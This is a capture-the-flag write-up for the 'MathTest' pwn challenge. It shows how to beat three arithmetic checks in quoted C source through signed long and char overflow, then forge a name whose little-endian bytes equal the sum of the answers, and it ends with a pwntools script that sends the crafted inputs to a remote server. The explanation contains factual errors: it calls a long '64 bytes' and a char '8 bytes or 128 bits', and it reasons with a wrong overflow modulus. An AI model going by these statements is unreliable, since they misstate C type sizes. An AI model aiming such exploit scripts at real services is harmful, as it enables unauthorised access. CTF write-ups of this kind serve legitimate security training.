## pwn/MathTest

Solve three multiplication questions and get a flag.  

`nc 18.207.140.246 9001`

Given source: [mathtest.c](./mathtest.c)

## Solution

After `netcat`ing the server, we get a prompt to choose a name.

```
Welcome to your Math Test. Perfect Score gets a Flag!
Enter Name:
```

Let's just ignore this for now and enter any random string.  
After this, we get another prompt:

```
36864*x < 0. What is x
```

Looking at the source code, we can see this:
```c
...
long mult1 = 0x9000;
	long ans1;
	printf("%ld*x < 0. What is x\n", mult1);
       	scanf("%ld", &ans1);
	if(ans1 < 0) {
		printf("No Negatives!\n");
		return 0;
	}
	if(mult1*ans1 > 0) {
		printf("Incorrect, try again\n");
		return 0;
	}
...
```

`mult1` is `0x9000` or $36864$ in base $10$. And the value of both `ans1` (the value we input) and `mult` is stored in a `long` datatype. We just need to overflow it so that it circles around to the negative values. Since size of a `long` is $64$ bytes. Therefore, we to get the answer, we just need to find $x$ such that:

$$
36864 x> 2^{63}-1 \\
\implies x > \frac{2^{63}-1}{36864} = 250199979298360.88 \\
$$

Now, since $x$ is an integer, we get:
$x \geq 250199979298361$

Taking this value, we get the next prompt:
```
Next Question
3735928559 * y = 0. What is y
```

Looking at the source:
```c
...
printf("Next Question\n");
	long mult2 = 0xdeadbeef;
	long ans2;
	printf("%ld * y = 0. What is y\n", mult2);
	scanf("%ld", &ans2);
	if(ans2 >= 0) {
                printf("Now Only Negatives!\n");
                return 0;
        }
        if((mult2*ans2) == 0) {
		printf("%ld\n", mult2*ans2);
                printf("Incorrect, try again\n");
                return 0;
        }
...
```

The prompt is misleading for some reason. We just need to bypass the `if (ans >= 0)` check. For this, just choose $y = -1$ and we get the next prompt.

```Final Quesiton
Good
O * z = 'A'. What is z?
```

Ascii value of the character `O` is $79$. ASCII value of `A` is $65$. We need to choose a $z$ such that the value of the product $79 z$ overflows and gives $65$. Also, since the size of a `char` in `C` is $8$ bytes or $128$ bits, the sort of "modulus" of overflow will be $128$. In other words, we need to find solution to the equation:
$$
79 z \equiv 65 \ (\text{mod } 128)
$$
After solving this simple equation, we find that one of its solution is:
$z = 111$ since, $79 \times 111 = 8769 \equiv 65 \ (\text{mod } 128)$.

Looking at the source, we see

```c
...
printf("Final Quesiton\n");
	char mult3 = 'O';
	char ans3;
	printf("Good\n");
	printf("%c * z = 'A'. What is z?\n", mult3);
	scanf("\n%c", &ans3);
	if((char)(ans3*mult3) != 'A') {
		printf("Incorrect, try again\n");
		return 0;
	}
...
```

The `scanf` here is taking a `char` as the input. We know that the character `o` has ASCII value $111$, so $z$ will be the character `o`.

Now comes the most important part:

```c
...
printf("Final Question: ans1 + ans2 + ans3 = name\n");
	long *n = (long *)name;

	if(ans1 + ans2 + ans3 == *n) {
		printf("Congratulations! Here is your flag!!!!\n");
		printflag();
	}	
	else {
		printf("If only you had a better name :(\n");
		return 0;
	}
...
```

Since the values of a string or an array of characters is contiguous in C, the line:
`long *n = (long *)name;` will work like similar to the `bytes_to_long` function, the catch here is, due to little endianness being default, the values will be reversed.

This now checks if the value $x+y+z$ is equal to `bytes_to_long(reversed(name))`. So we have to carefully choose the `name` next time. We know that the value $x+y+z$ is $250199979298361 + (-1) + 111 = 250199979298471$, So we just need to give `reversed(long_to_bytes(250199979298471))` as `name`. We can easily do this using python pwntools.


## Script
```python
from pwn import *

# r = process('./mathtest')
r = remote('18.207.140.246', 9001)


def long_to_bytes(n):
    l = []
    x = 0
    off = 0
    while x != n:
        b = (n >> off) & 0xFF
        l.append( b )
        x = x | (b << off)
        off += 8
    l.reverse()
    return bytes(l)

username = bytes(reversed(long_to_bytes(250199979298361 + (-1) + 111)))

r.sendlineafter(b'Enter Name:', username)
r.sendlineafter(b'What is x', b'250199979298361')
r.sendlineafter(b'What is y', b'-1')
r.sendlineafter(b'What is z?', b'o')

r.interactive()
```
